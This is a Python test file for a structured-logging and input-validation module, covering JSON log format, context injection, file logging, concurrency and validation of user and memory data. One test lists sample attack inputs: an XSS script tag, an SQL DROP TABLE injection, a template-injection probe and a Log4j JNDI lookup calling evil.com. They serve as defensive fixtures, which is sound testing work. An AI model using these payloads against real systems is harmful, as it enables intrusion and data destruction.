#!/usr/bin/env python3
"""
Comprehensive tests for the logging and validation system.
Tests structured logging output format, context injection, and input validation with edge cases.
"""

import json
import tempfile
import os
from pathlib import Path
from unittest.mock import patch, MagicMock
import pytest
from typing import Dict, Any, List

# Import logging and validation utilities
from logging_utils import (
    StructuredLogger, 
    ValidationResult, 
    ValidationError,
    InputValidator,
    setup_application_logging,
    get_logger,
    validate_user_input,
    validate_memory
)
from config.manager import ConfigManager
from config.models import LoggingConfig


class TestStructuredLogging:
    """Test structured logging functionality."""
    
    def setup_method(self):
        """Set up test environment."""
        self.temp_log_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.log')
        self.temp_log_file.close()
        
        # Create test logging config
        self.logging_config = LoggingConfig(
            level="DEBUG",
            format="json",
            enable_file_logging=True,
            log_file_path=self.temp_log_file.name,
            enable_performance_logging=True
        )
    
    def teardown_method(self):
        """Clean up test environment."""
        if os.path.exists(self.temp_log_file.name):
            os.unlink(self.temp_log_file.name)
    
    def test_structured_logger_creation(self):
        """Test StructuredLogger creation and configuration."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        assert logger.name == "test_logger"
        assert logger.config == self.logging_config
        assert logger._context == {}
    
    def test_json_log_format(self):
        """Test that logs are formatted as valid JSON."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Test that _build_log_data produces valid JSON-serializable data
        log_data = logger._build_log_data("Test message", "INFO", test_key="test_value", number=42)
        
        # Verify the log data structure
        assert isinstance(log_data, dict)
        assert log_data["message"] == "Test message"
        assert log_data["level"] == "INFO"
        assert log_data["logger"] == "test_logger"
        assert "timestamp" in log_data
        assert "context" in log_data
        assert log_data["context"]["test_key"] == "test_value"
        assert log_data["context"]["number"] == 42
        
        # Verify it can be serialized to JSON
        json_str = json.dumps(log_data)
        assert isinstance(json_str, str)
        
        # Verify it can be deserialized back
        parsed_data = json.loads(json_str)
        assert parsed_data == log_data
    
    def test_context_injection(self):
        """Test that context is properly injected into log messages."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Set persistent context
        logger.set_context(user_id="test_user", session_id="test_session")
        
        # Build log data to test context injection
        log_data = logger._build_log_data("Test message", "INFO", extra_key="extra_value")
        
        assert "context" in log_data
        assert log_data["context"]["user_id"] == "test_user"
        assert log_data["context"]["session_id"] == "test_session"
        assert log_data["context"]["extra_key"] == "extra_value"
        assert log_data["message"] == "Test message"
        assert log_data["level"] == "INFO"
        assert log_data["logger"] == "test_logger"
        assert "timestamp" in log_data
    
    def test_context_clearing(self):
        """Test that context can be cleared."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Set context
        logger.set_context(test_key="test_value")
        assert logger._context == {"test_key": "test_value"}
        
        # Clear context
        logger.clear_context()
        assert logger._context == {}
    
    def test_log_levels(self):
        """Test all log levels work correctly."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Test each log level
        logger.debug("Debug message", debug_key="debug_value")
        logger.info("Info message", info_key="info_value")
        logger.warning("Warning message", warning_key="warning_value")
        logger.error("Error message", error_key="error_value")
        logger.critical("Critical message", critical_key="critical_value")
        
        # Test error with exception
        try:
            raise ValueError("Test exception")
        except ValueError as e:
            logger.error("Error with exception", error=e, context_key="context_value")
    
    def test_performance_timer(self):
        """Test performance timing functionality."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Test performance timer context manager
        with logger.performance_timer("test_operation", operation_type="test"):
            # Simulate some work
            import time
            time.sleep(0.01)
        
        # Performance timer should work even when performance logging is disabled
        config_no_perf = LoggingConfig(
            level="INFO",
            format="json",
            enable_performance_logging=False
        )
        logger_no_perf = StructuredLogger("test_logger", config_no_perf)
        
        with logger_no_perf.performance_timer("test_operation"):
            pass
    
    def test_text_format_logging(self):
        """Test text format logging."""
        text_config = LoggingConfig(
            level="INFO",
            format="text",
            enable_file_logging=False
        )
        
        logger = StructuredLogger("test_logger", text_config)
        logger.info("Test text message", key="value")
    
    def test_file_logging(self):
        """Test file-based logging."""
        logger = StructuredLogger("test_logger", self.logging_config)
        
        # Log some messages
        logger.info("File log test message 1", test_key="test_value1")
        logger.error("File log test message 2", test_key="test_value2")
        
        # Force flush
        for handler in logger._logger.handlers:
            handler.flush()
        
        # Check that log file was created and contains messages
        assert os.path.exists(self.temp_log_file.name)
        
        with open(self.temp_log_file.name, 'r') as f:
            log_content = f.read()
            assert "File log test message 1" in log_content
            assert "File log test message 2" in log_content


class TestInputValidation:
    """Test input validation functionality."""
    
    def test_validation_result_model(self):
        """Test ValidationResult model functionality."""
        # Test valid result
        valid_result = ValidationResult(is_valid=True)
        assert valid_result.is_valid
        assert len(valid_result.errors) == 0
        assert len(valid_result.warnings) == 0
        
        # Test invalid result with errors
        error1 = ValidationError(field="field1", message="Error 1", value="invalid_value")
        error2 = ValidationError(field="field2", message="Error 2", value=None)
        
        invalid_result = ValidationResult(
            is_valid=False,
            errors=[error1, error2],
            warnings=["Warning message"]
        )
        
        assert not invalid_result.is_valid
        assert len(invalid_result.errors) == 2
        assert len(invalid_result.warnings) == 1
        assert invalid_result.errors[0].field == "field1"
        assert invalid_result.errors[0].message == "Error 1"
        assert invalid_result.errors[1].field == "field2"
    
    def test_validation_error_model(self):
        """Test ValidationError model functionality."""
        error = ValidationError(
            field="test_field",
            message="Test error message",
            value="invalid_value",
            error_code="INVALID_FORMAT"
        )
        
        assert error.field == "test_field"
        assert error.message == "Test error message"
        assert error.value == "invalid_value"
        assert error.error_code == "INVALID_FORMAT"
    
    def test_user_message_validation(self):
        """Test user message validation."""
        # Test valid messages
        valid_messages = [
            "Hello, how are you?",
            "What's the weather like today?",
            "Can you help me with a problem?",
            "I'm feeling a bit sad today.",
            "Tell me a joke!",
            "What is 2 + 2?",
            "A" * 100,  # Long but valid message
        ]
        
        for message in valid_messages:
            result = validate_user_input(message)
            assert result.is_valid, f"Message should be valid: {message}"
            assert len(result.errors) == 0
    
    def test_user_message_validation_edge_cases(self):
        """Test user message validation with edge cases."""
        # Test invalid messages
        invalid_cases = [
            ("", "Empty message"),
            ("   ", "Whitespace only message"),
            ("A" * 10001, "Message too long"),
            (None, "None message"),
        ]
        
        for message, description in invalid_cases:
            try:
                result = validate_user_input(message)
                if message is None:
                    # None should raise an exception or be handled gracefully
                    continue
                assert not result.is_valid, f"{description} should be invalid"
                assert len(result.errors) > 0
            except (TypeError, AttributeError):
                # Expected for None input
                pass
    
    def test_user_message_validation_malicious_input(self):
        """Test user message validation with potentially malicious input."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "\x00\x01\x02",  # Control characters
            "🚀" * 1000,  # Unicode spam
        ]
        
        for malicious_input in malicious_inputs:
            result = validate_user_input(malicious_input)
            # These should either be valid (sanitized) or invalid with clear errors
            if not result.is_valid:
                assert len(result.errors) > 0
    
    def test_memory_validation(self):
        """Test memory data validation."""
        # Test valid memory data
        valid_memory_data = {
            "user_message": "Hello",
            "ai_response": "Hi there!",
            "timestamp": "2024-01-01T00:00:00Z",
            "context": "greeting"
        }
        
        result = validate_memory(valid_memory_data)
        assert result.is_valid
        assert len(result.errors) == 0
    
    def test_memory_validation_edge_cases(self):
        """Test memory validation with edge cases."""
        # Test potentially invalid memory data
        test_cases = [
            ({}, "Empty memory data"),
            ({"user_message": ""}, "Missing required fields"),
            ({"user_message": "Hello", "ai_response": ""}, "Empty AI response"),
            ({"user_message": "A" * 10001, "ai_response": "Hi"}, "Message too long"),
            (None, "None memory data"),
            ("not a dict", "Invalid data type"),
        ]
        
        for memory_data, description in test_cases:
            try:
                result = validate_memory(memory_data)
                # The validation might be lenient, so we just check that it doesn't crash
                assert isinstance(result, ValidationResult), f"Should return ValidationResult for {description}"
                if not result.is_valid:
                    assert len(result.errors) > 0, f"Invalid result should have errors for {description}"
            except (TypeError, AttributeError):
                # Expected for invalid input types like None or non-dict
                pass
    
    def test_input_validator_class_methods(self):
        """Test InputValidator class methods."""
        # Test validate_user_message
        result = InputValidator.validate_user_message("Hello, world!")
        assert result.is_valid
        
        # Test validate_config_data
        valid_config = {
            "memory": {"turns_to_summarize": 10},
            "llm": {"temperature": 0.7}
        }
        result = InputValidator.validate_config_data(valid_config)
        assert result.is_valid
        
        # Test with invalid config
        invalid_config = {
            "memory": {"turns_to_summarize": -1},  # Invalid value
            "llm": {"temperature": 3.0}  # Invalid value
        }
        result = InputValidator.validate_config_data(invalid_config)
        # This might be valid depending on implementation
        # The test is mainly to ensure no exceptions are raised


class TestLoggingIntegration:
    """Test logging system integration."""
    
    def test_setup_logging_function(self):
        """Test the setup_logging function."""
        with tempfile.TemporaryDirectory() as temp_dir:
            log_file = os.path.join(temp_dir, "test.log")
            
            # Mock config manager
            with patch('logging_utils.get_config_manager') as mock_config:
                mock_logging_config = LoggingConfig(
                    level="DEBUG",
                    format="json",
                    enable_file_logging=True,
                    log_file_path=log_file
                )
                mock_config.return_value.get_logging_config.return_value = mock_logging_config
                
                # Call setup_application_logging
                setup_application_logging()
                
                # Verify that logging was configured
                assert mock_config.called
    
    def test_get_logger_function(self):
        """Test the get_logger convenience function."""
        logger = get_logger("test_module")
        
        assert isinstance(logger, StructuredLogger)
        assert logger.name == "test_module"
    
    def test_logging_with_different_configurations(self):
        """Test logging with different configuration settings."""
        configs = [
            LoggingConfig(level="DEBUG", format="json"),
            LoggingConfig(level="INFO", format="text"),
            LoggingConfig(level="WARNING", format="json", enable_performance_logging=True),
            LoggingConfig(level="ERROR", format="text", enable_file_logging=False),
        ]
        
        for config in configs:
            logger = StructuredLogger("test_logger", config)
            
            # Test that logger works with each configuration
            logger.debug("Debug message")
            logger.info("Info message")
            logger.warning("Warning message")
            logger.error("Error message")
    
    def test_concurrent_logging(self):
        """Test that logging works correctly with concurrent access."""
        import threading
        import time
        
        logger = StructuredLogger("concurrent_test", LoggingConfig())
        results = []
        
        def log_messages(thread_id: int):
            for i in range(10):
                logger.info(f"Message from thread {thread_id}", 
                           thread_id=thread_id, 
                           message_number=i)
                time.sleep(0.001)  # Small delay
            results.append(f"Thread {thread_id} completed")
        
        # Create and start multiple threads
        threads = []
        for i in range(3):
            thread = threading.Thread(target=log_messages, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        assert len(results) == 3
        assert all("completed" in result for result in results)


def run_all_tests():
    """Run all logging and validation tests."""
    print("🔍 Running logging and validation system tests...\n")
    
    try:
        # Run structured logging tests
        test_class = TestStructuredLogging()
        test_methods = [method for method in dir(test_class) if method.startswith('test_')]
        
        for method_name in test_methods:
            test_class.setup_method()
            try:
                method = getattr(test_class, method_name)
                method()
                print(f"✅ {method_name}")
            finally:
                test_class.teardown_method()
        
        # Run input validation tests
        validation_test_class = TestInputValidation()
        validation_methods = [method for method in dir(validation_test_class) if method.startswith('test_')]
        
        for method_name in validation_methods:
            method = getattr(validation_test_class, method_name)
            method()
            print(f"✅ {method_name}")
        
        # Run integration tests
        integration_test_class = TestLoggingIntegration()
        integration_methods = [method for method in dir(integration_test_class) if method.startswith('test_')]
        
        for method_name in integration_methods:
            method = getattr(integration_test_class, method_name)
            method()
            print(f"✅ {method_name}")
        
        print("\n✅ All logging and validation tests passed!")
        return True
        
    except Exception as e:
        print(f"\n❌ Logging and validation test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == "__main__":
    import sys
    success = run_all_tests()
    sys.exit(0 if success else 1)